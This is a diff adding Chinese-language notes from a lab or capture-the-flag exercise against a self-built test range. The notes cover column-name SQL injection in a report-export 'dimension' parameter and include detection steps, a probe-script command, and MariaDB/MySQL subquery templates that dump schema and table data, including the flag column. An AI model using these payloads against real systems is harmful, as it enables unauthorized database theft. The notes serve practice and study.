@@ -162,23 +162,62 @@ sqlmap -u "http://<host>/<path>" --proxy http://127.0.0.1:8890 ...
 1. 不同页面的 `_csrf` **不是一个值**——登录页和注册页各自独立，必须分页取；
 2. 应用在成功操作后会**轮换令牌/会话** → 旧令牌立刻失效（表现为后续请求全 403）。做长跑前先确认令牌有效性。
 
+## 报表导出 / 列名注入（2026-10-23 NEXA 实测）
+
+**形态**：导出接口把参数当**列名或表达式**拼进 SQL：
+`/merchant/reports/export?from=2026-07-26&to=2026-10-23&dimension=category`。
+`dimension` 不是值，是 `GROUP BY` 的列名/表达式。
+
+**识别**：
+1. 基线返回 `text/csv`，第一列是维度名；
+2. `dimension=category'` → **500**（引号破坏 SQL）；
+3. `dimension=category AND 1=1` 也可能 500（表达式在 GROUP BY 里不成立）；
+4. `dimension=(SELECT 1)` → **200**，CSV 第一列变成 `1` → 标量子查询可用。
+
+**取证脚本**（4 发，自动识别登录页与 Cookie 轮换）：
+
+```
+python scripts/expr_probe.py \
+  --target "https://host/merchant/reports/export?from=2026-07-26&to=2026-10-23&dimension=*" \
+  --base category --cookie-jar cookies.txt \
+  --expr "(SELECT version())" --expr "(SELECT database())"
+```
+
+**MariaDB/MySQL 取数模板**（结果都出现在 CSV 第一列）：
+
+```
+(SELECT version())
+(SELECT database())
+(SELECT user())
+(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())
+(SELECT group_concat(concat(table_name,':',column_name)) FROM information_schema.columns WHERE table_schema=database())
+(SELECT group_concat(concat(meta_key,'=',meta_value) SEPARATOR ' || ') FROM report_meta)
+(SELECT group_concat(concat(period,'|',owner,'|',note,'|',audit_token) SEPARATOR ' || ') FROM ops_audit_notes)
+```
+
+NEXA 实测：MariaDB 10.11，库 `nexa_report`，只读账号 `nexa_report_ro@...`；表 `report_meta / order_facts / ops_audit_notes / merchant_snapshot / merchant_monthly / customer_snapshot`。`ops_audit_notes.audit_token` 就是挑战凭据（值不在本文档保留）。
+
+**sqlmap 在这里为何负价值**：它把 `dimension` 当普通值，发大量引号/布尔/UNION 载荷，全部 500，最后判 `not injectable`；而正确答案是 4 发手工探测。**报表/导出/排序类参数，先想“它是不是列名”，再上扫描器。**
+
 ## NEXA 实战全景（2026-10-23，自建 B2B 靶场，cloudflare tunnel）
 
 | 端点 | 参数 | 结论 | 机制 |
 |---|---|---|---|
-| /market | category / q / sort | not injectable | 参数进查询前被类型/白名单校验 |
-| /suppliers | region / tier | not injectable | 同上（枚举值型参数） |
-| /product/<slug>-<id> | 路径里的 id | not injectable | **路由层格式校验**：带引号的 slug 一律 404，payload 根本没进 SQL |
-| /cart/add | product_id | not injectable | **应用层整数校验**：非整数 → 422「缺少商品编号」 |
-| /register | name / company / phone / email | **待测** | 限速挡住（IP 级），冷却后用 inject_probe 成对测 |
-| /login | email / password | **待测** | 限速（429） |
-| /cart/update | qty[键] / qty[值] / product_id | **待测** | 需登录态（购物车按会话存） |
-| /app.js | — | 无 API 面 | 纯服务端渲染表单，零 fetch/axios |
+| /market | category / q / sort / page | not injectable | 参数化或白名单 |
+| /suppliers | q / region / tier / page | not injectable | 同上 |
+| /product/<slug>、/supplier/<slug> | 路径 slug | not injectable | 路由层严格格式校验，payload 进不了 SQL |
+| /buyer/orders、/buyer/tickets、/buyer/invoices | q / status / 数字 ID | not injectable | 参数化 + 归属校验（跨账号 404） |
+| /login、/register | email / password / name / company | not injectable | 格式校验 + 参数化 |
+| /merchant/orders | q / status | not injectable | 参数化 LIKE / 白名单 |
+| **/merchant/reports/export** | **dimension** | **INJECTABLE（表达式）** | 列名直接拼接；`category'` → 500，`(SELECT 1)` → CSV 第一列 `1` |
+| /admin/*、/merchant/* | 角色 | 买家 403 | 三个工作台：buyer / merchant / admin，路由真实存在 |
 
 **教训（可复用到别的靶场）**：
-- 数字 ID 出现在**路径**里（`/product/xxx-113`）是高价值线索，但**先看它有没有格式校验**——有的话别浪费请求。
-- **数组式参数名**（`qty[113]`）是常被忽略的注入位：值校验了，键名可能没校验。
-- 应用限速是**正当防护**，撞上就停、等窗口，别把"被限速"写成"不可注入"。
+- **先数工作台**：`/buyer` 干净不代表整站干净；`/merchant`、`/admin` 的 302/403/404 能直接告诉你路由和角色。
+- **报表导出是高价值面**：`from`/`to`/`dimension` 三件套里，`dimension` 最可能是列名注入。
+- **会话轮换**：演示站的 `nexa_sid` 会轮换，静态 `--cookie` 跑几发就掉登录页；用 cookie jar。
+- 数字 ID 在路径里先看格式校验；数组键名（`qty[113]`）常被漏掉，但 NEXA 这里是安全的。
+- 应用限速是正当防护；但 NEXA 的瓶颈其实是隧道 2–4 秒延迟，不是 600 次/分钟。
 
 ## 结果解读
 
